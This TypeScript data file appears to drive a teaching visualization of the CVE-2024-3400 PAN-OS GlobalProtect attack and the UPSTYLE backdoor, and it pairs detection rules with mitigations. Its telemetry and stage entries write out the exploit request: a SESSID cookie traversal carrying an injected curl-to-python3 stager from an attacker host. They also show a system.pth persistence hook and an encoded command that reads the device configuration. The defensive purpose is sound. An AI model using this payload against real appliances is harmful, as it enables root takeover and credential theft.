import type { AttackScenario } from '../types';

export const scenario: AttackScenario = {
  id: 'unit42-panos-midnight-eclipse',
  code: 'CVE-2024-3400',
  name: 'Unit 42 — Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor',
  shortSubtitle: 'Palo Alto Unit 42 · CVE-2024-3400 Telemetry Cron Injection & system.pth Persistence',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Palo Alto Networks Unit 42 (UTA0218 / Operation MidnightEclipse), threat actors exploited CVE-2024-3400 (CVSS 10.0) in PAN-OS GlobalProtect gateway portals. By injecting arbitrary shell commands inside the HTTP SESSID cookie path traversal (/opt/panlogs/tmp/device_telemetry/minute/), attackers forced the root device_telemetry cron job to execute curl/wget payloads, deploying the Python-based UPSTYLE in-memory backdoor via /usr/lib/python3.6/site-packages/system.pth.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Palo Alto Networks Unit 42 — Operation MidnightEclipse (CVE-2024-3400)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1059.004 (Unix Shell) · T1546.016 (Python .pth)',
    },
    {
      term: 'BACKDOOR ARTIFACT',
      value: 'UPSTYLE (/usr/lib/python3.6/site-packages/system.pth & sslvpn-access.log)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/opt/panlogs/tmp/device_telemetry/minute/ & /var/log/pan/gpsvc.log',
    },
  ],
  nodes: [
    {
      id: 'uta0218_actor',
      label: 'UTA0218 Threat Actor',
      sublabel: '198.51.100.77 (Exploit & Stage Host)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure (UTA0218)',
        pidOrPort: 'HTTPS :443 -> /global-protect/login.esp',
        privilege: 'Unauthenticated External',
        artifacts: [
          'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/a`curl ...`',
          'HTTP Stage: update.py (UPSTYLE Installer)',
        ],
        description:
          'UTA0218 operator sending crafted HTTP POST requests to GlobalProtect with shell backticks embedded in the SESSID cookie header.',
      },
    },
    {
      id: 'panos_gateway',
      label: 'PAN-OS GlobalProtect Edge',
      sublabel: '172.16.10.5 (CVE-2024-3400 Target)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'PAN-OS Gateway Appliance (Linux Kernel)',
        pidOrPort: 'TCP/443 (sslvpnd / gpsvc)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/opt/panlogs/tmp/device_telemetry/minute/',
          '/var/log/pan/sslvpn-access.log',
        ],
        description:
          'Internet-facing GlobalProtect portal where malformed SESSID cookies create arbitrary filenames in the device_telemetry minute directory.',
      },
    },
    {
      id: 'upstyle_python',
      label: 'UPSTYLE Python Backdoor',
      sublabel: 'system.pth (In-Memory Monitor)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Python 3.6 Runtime Hook (system.pth)',
        pidOrPort: 'PID 18422 · /proc/self/cmdline',
        privilege: 'root',
        artifacts: [
          '/usr/lib/python3.6/site-packages/system.pth',
          '/usr/local/bin/pan_web_install/lib/python3.6/site-packages/system.pth',
        ],
        description:
          'UPSTYLE persistence script loaded automatically by Python via system.pth, parsing img[...] regex commands from sslvpn-access.log.',
      },
    },
    {
      id: 'pan_config_store',
      label: 'PAN-OS Config & Running XML',
      sublabel: '/opt/pancfg/mgmt/saved-configs',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Appliance Configuration & Credential Store',
        pidOrPort: 'running-config.xml & master key',
        privilege: 'Appliance Root Store',
        artifacts: [
          '/opt/pancfg/mgmt/saved-configs/running-config.xml',
          '/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css',
        ],
        description:
          'PAN-OS configuration repository extracted by the attacker and written to bootstrap.min.css for unauthenticated HTTP retrieval before restoration.',
      },
    },
    {
      id: 'cortex_xdr_siem',
      label: 'Unit 42 / Cortex XDR SIEM',
      sublabel: 'Syslog & Auditd Telemetry Collector',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Threat Hunting Platform',
        pidOrPort: 'PAN-OS System Logs & Linux Auditd',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Threat ID 95187 / 95189 / 95191',
          'Auditd execve dt_curl & system.pth creation',
        ],
        description:
          'Monitors PAN-OS gpsvc logs, unexpected zero-byte files in device_telemetry/minute, and Python .pth startup modifications.',
      },
    },
  ],
  processTree: [
    {
      pid: 2410,
      ppid: 1,
      name: 'gpsvc (GlobalProtect)',
      commandLine: '/usr/local/bin/gpsvc -c /etc/pan/gpsvc.conf',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['open("/opt/panlogs/tmp/device_telemetry/minute/...")', 'close'],
    },
    {
      pid: 17904,
      ppid: 17900,
      name: 'dt_curl / cron shell',
      commandLine:
        '/bin/sh -c curl -s http://198.51.100.77/update.py | python3',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: ['fork', 'execve("/bin/sh")', 'socket(AF_INET, SOCK_STREAM)'],
    },
    {
      pid: 18422,
      ppid: 1,
      name: 'python3 (UPSTYLE system.pth)',
      commandLine: 'python3 -m SimpleHTTPServer (hooked via system.pth)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: [
        'open("/proc/self/cmdline")',
        'inotify_add_watch("/var/log/pan/sslvpn-access.log")',
        'os.popen(cmd)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F9B40100000',
          section: 'system.pth -> exec(base64.b64decode(...))',
          permissions: 'RWX',
          size: '48 KB',
          status: 'injected',
          description:
            'In-memory Python thread spawned by system.pth watching sslvpn-access.log for img[...] base64 commands.',
          hexPreview: 'import os,re,time,base64,threading; pattern=r"img\\[([a-zA-Z0-9+/=]+)\\]"',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400)',
      subtitle: 'Arbitrary file creation in /opt/panlogs/tmp/device_telemetry/minute/',
      description:
        'As documented by Unit 42, the attacker sends an HTTPS POST request to /global-protect/login.esp with a directory traversal payload inside the SESSID cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aa`curl...`. The GlobalProtect daemon (gpsvc) creates a zero-byte file whose filename contains the backtick-enclosed shell command.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['uta0218_actor', 'panos_gateway', 'cortex_xdr_siem'],
      compromisedNodeIds: ['panos_gateway'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2024-3400 (CVSS 10.0 Unauthenticated RCE)' },
        { term: 'HTTP HEADER', value: 'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/' },
        { term: 'TARGET DAEMON', value: 'gpsvc / sslvpnd on TCP 443' },
      ],
    },
    {
      index: 2,
      title: 'TELEMETRY CRON SHELL EXECUTION (DT_CURL)',
      subtitle: 'Root cron job passes unsanitized filename to shell',
      description:
        'Every minute, the PAN-OS device telemetry cron job executes dt_curl to bundle and transmit telemetry files. Because filenames in /opt/panlogs/tmp/device_telemetry/minute/ are interpolated directly into a shell command without sanitization, the backtick payload executes as root, fetching and piping update.py directly into python3.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['panos_gateway', 'uta0218_actor', 'upstyle_python'],
      compromisedNodeIds: ['panos_gateway', 'upstyle_python'],
      keySpecs: [
        { term: 'CRON SCRIPT', value: 'dt_curl (Device Telemetry Minute Job)' },
        { term: 'STAGER URL', value: 'curl -s http://198.51.100.77/update.py | python3' },
        { term: 'EXECUTION CONTEXT', value: 'uid=0(root) gid=0(root)' },
      ],
    },
    {
      index: 3,
      title: 'UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2',
      subtitle: 'Writing system.pth and parsing sslvpn-access.log for img[...] commands',
      description:
        'The update.py dropper writes a malicious startup hook to /usr/lib/python3.6/site-packages/system.pth. Whenever any Python process starts on the appliance, system.pth decodes the UPSTYLE backdoor, inspects /proc/self/cmdline, and monitors /var/log/pan/sslvpn-access.log for HTTP requests matching img\\[(.*?)\\]. Output is written into bootstrap.min.css and the original CSS file is restored 15 seconds later.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1546.016',
      mitreTechniqueName: 'Event Triggered Execution: Installer Packages / Python .pth',
      activeNodeIds: ['upstyle_python', 'pan_config_store', 'cortex_xdr_siem'],
      compromisedNodeIds: ['panos_gateway', 'upstyle_python', 'pan_config_store'],
      keySpecs: [
        { term: 'PERSISTENCE FILE', value: '/usr/lib/python3.6/site-packages/system.pth' },
        { term: 'C2 TRIGGER REGEX', value: 'img\\[([a-zA-Z0-9+/=]+)\\] in sslvpn-access.log' },
        { term: 'EXFIL & CLEANUP', value: 'Writes output to bootstrap.min.css + restores running.bak' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'u42-pan-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:14:02.118',
      sourceNodeId: 'uta0218_actor',
      targetNodeId: 'panos_gateway',
      sourceLabel: '198.51.100.77',
      targetLabel: 'PAN-OS GP :443',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / Threat 95187',
      shortAction: 'SESSID TRAVERSAL',
      info: 'POST /global-protect/login.esp Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/a`curl...`',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Unit 42 documented that CVE-2024-3400 exploitation begins with a crafted SESSID cookie traversing into /opt/panlogs/tmp/device_telemetry/minute/ and embedding shell commands inside backticks.',
      rawLog: `POST /global-protect/login.esp HTTP/1.1
Host: 172.16.10.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aa\`curl${'${IFS}'}-s${'${IFS}'}http://198.51.100.77/update.py|python3\`
Content-Type: application/x-www-form-urlencoded
Content-Length: 0`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Unit 42 — PAN-OS GlobalProtect CVE-2024-3400 SESSID Path Traversal',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"UNIT42 PAN-OS CVE-2024-3400 SESSID Path Traversal"; flow:established,to_server; http.cookie; content:"SESSID="; content:"/opt/panlogs/tmp/device_telemetry/"; distance:0; classtype:attempted-admin; sid:9518701; rev:1;)`,
        mitigation:
          'Apply PAN-OS hotfixes (10.2.9-h1, 11.0.4-h1, 11.1.2-h3) and enable Threat Prevention IDs 95187, 95189, and 95191.',
      },
    },
    {
      id: 'u42-pan-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:15:00.042',
      sourceNodeId: 'panos_gateway',
      targetNodeId: 'upstyle_python',
      sourceLabel: 'dt_curl (root)',
      targetLabel: 'python3 update.py',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd SYSCALL 59',
      shortAction: 'CRON RCE (ROOT)',
      info: 'SYSCALL execve /bin/sh -c "curl -s http://198.51.100.77/update.py | python3" uid=0',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'When the minute telemetry cron job runs, the shell evaluates the backtick expression inside the filename and executes update.py as root.',
      rawLog: `type=SYSCALL msg=audit(1712891700.042:8841): arch=c000003e syscall=59 success=yes exit=0 a0=55a8c120 a1=55a8c190 a2=55a8c1b0 a3=8 items=2 ppid=17900 pid=17904 auid=4294967295 uid=0 gid=0 euid=0 tty=(none) comm="sh" exe="/bin/bash"
type=EXECVE msg=audit(1712891700.042:8841): argc=3 a0="/bin/sh" a1="-c" a2="curl -s http://198.51.100.77/update.py | python3"
[gpsvc.log] Error: failed to open telemetry file /opt/panlogs/tmp/device_telemetry/minute/aa`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PAN-OS Telemetry Cron Spawning Outbound Curl / Python Stager',
        ruleCode: `title: PAN-OS CVE-2024-3400 Root Telemetry Command Injection
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: 'EXECVE'
    a2|contains:
      - 'device_telemetry'
      - 'update.py'
      - 'system.pth'
  condition: selection
level: critical`,
        mitigation:
          'Inspect /var/log/pan/device_telemetry_send.log and /opt/panlogs/tmp/device_telemetry/minute/ for shell metacharacters.',
      },
    },
    {
      id: 'u42-pan-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:15:04.619',
      sourceNodeId: 'upstyle_python',
      targetNodeId: 'pan_config_store',
      sourceLabel: 'UPSTYLE (system.pth)',
      targetLabel: 'bootstrap.min.css / running-config',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'YARA UPSTYLE_Backdoor',
      shortAction: 'SYSTEM.PTH HOOK',
      info: 'Writes /usr/lib/python3.6/site-packages/system.pth & watches sslvpn-access.log for img[...]',
      sizeOrCode: '4,128 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1546.016',
      explanation:
        'UPSTYLE achieves fileless-style execution on Python startup via system.pth, reading commands from invalid 404 requests in sslvpn-access.log and writing command output to bootstrap.min.css before restoring running.bak.',
      rawLog: `[FILE_WRITE] /usr/lib/python3.6/site-packages/system.pth
import os,sys,base64;exec(base64.b64decode('aW1wb3J0IG9zLHJlLHRpbWUsYmFzZTY0LHRocmVhZGluZztkZWYgcheck():...'))
[SSLVPN-ACCESS.LOG] 198.51.100.77 - - "GET /global-protect/portal/images/img[Y2F0IC9vcHQvcGFuY2ZnL21nbXQvc2F2ZWQtY29uZmlncy9ydW5uaW5nLWNvbmZpZy54bWw=] HTTP/1.1" 404
[CLEANUP] shutil.move("/var/appweb/sslvpndocs/global-protect/portal/css/running.bak", ".../bootstrap.min.css")`,
      detectionRule: {
        type: 'YARA',
        title: 'Unit 42 Official YARA — Python UPSTYLE Backdoor (system.pth)',
        ruleCode: `rule PaloAlto_Unit42_UPSTYLE_Backdoor {
  meta:
    author = "Palo Alto Networks Unit 42"
    reference = "Operation MidnightEclipse CVE-2024-3400"
  strings:
    $s1 = "/var/log/pan/sslvpn-access.log" ascii
    $s2 = "/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css" ascii
    $s3 = "img\\\\[([a-zA-Z0-9+/=]+)\\\\]" ascii
    $s4 = "/proc/self/cmdline" ascii
  condition:
    3 of ($s*)
}`,
        mitigation:
          'Perform a factory reset and redeploy compromised PAN-OS images; rotate all device credentials and private certificates stored in running-config.xml.',
      },
    },
  ],
};
